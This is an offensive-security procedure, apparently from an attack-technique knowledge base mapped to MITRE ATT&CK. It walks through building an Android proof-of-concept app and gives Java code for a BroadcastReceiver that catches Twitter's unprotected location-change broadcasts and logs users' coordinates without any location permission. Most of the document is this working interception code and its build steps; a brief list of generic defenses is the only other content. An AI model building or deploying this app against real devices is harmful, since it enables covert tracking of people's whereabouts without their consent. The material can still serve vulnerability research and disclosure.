---
tags:
  - android
  - poc-development
  - broadcast-receiver
  - interception
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
platforms:
  - Android
techniques:
  - '[[T1429]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: a615d1cb-b516-4528-a40a-13f1fe462b23
created_at: '2025-12-14T17:24:42.753Z'
updated_at: '2025-12-14T17:24:42.753Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[T1429]]'
---
# Develop-POC-App-to-Intercept-Broadcasts

## Summary

This procedure creates a proof-of-concept Android app that registers a BroadcastReceiver to listen for Twitter's unsecured location broadcasts, demonstrating interception without permissions.

## Description

The procedure targets Android devices where Twitter is installed and location services are enabled. It involves developing a simple app with a receiver for the 'com.twitter.library.geo.LOCATION_CHANGED' Intent, logging received location data. Prerequisites include Android SDK and Java knowledge. Outcomes: A deployable APK that captures and displays location coordinates in real-time, proving the privacy violation.

## Requirements

1. Android Studio installed
2. Android SDK with API level matching Twitter app (e.g., API 21+)
3. Basic Java programming skills for Android development
4. No special device permissions needed for the POC

## Defense

Defensive measures and detection strategies:

- Users should review installed apps for suspicious BroadcastReceivers
- App stores can scan for apps registering for sensitive Intents
- Device-level policies to restrict inter-app communications

## Objectives

1. Build an app that passively receives location broadcasts from Twitter
2. Log or display intercepted data to validate vulnerability
3. Ensure no location permissions are required

## Instructions

### Step 1: Create New Android Project

**Context**: Set up the project structure in Android Studio.

Open Android Studio, create a new Empty Activity project named 'TwitterLocationInterceptor'.

Add to AndroidManifest.xml inside <application>:

```xml
<receiver android:name=".TwitterGPSReceiver" />
```

> This registers the receiver without intent filters for dynamic registration.

### Step 2: Implement BroadcastReceiver

**Context**: Code the receiver to handle the location Intent.

Create TwitterGPSReceiver.java:

```java
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class TwitterGPSReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if ("com.twitter.library.geo.LOCATION_CHANGED".equals(intent.getAction())) {
            double lat = intent.getDoubleExtra("lat", 0.0);
            double lon = intent.getDoubleExtra("lon", 0.0);
            Log.d("TwitterGPS", "Intercepted Location: " + lat + ", " + lon);
            // Display in UI or save to file
        }
    }
}
```

> Expected output: Logs location extras when broadcast is received.

### Step 3: Register Receiver in MainActivity

**Context**: Dynamically register the receiver in the activity.

In MainActivity.java onCreate:

```java
TwitterGPSReceiver receiver = new TwitterGPSReceiver();
IntentFilter filter = new IntentFilter("com.twitter.library.geo.LOCATION_CHANGED");
registerReceiver(receiver, filter);
```

Don't forget to unregister in onDestroy.

> Build the APK; successful compilation confirms the interception setup.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[T1429]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[android]]
- [[poc-development]]
- [[broadcast-receiver]]
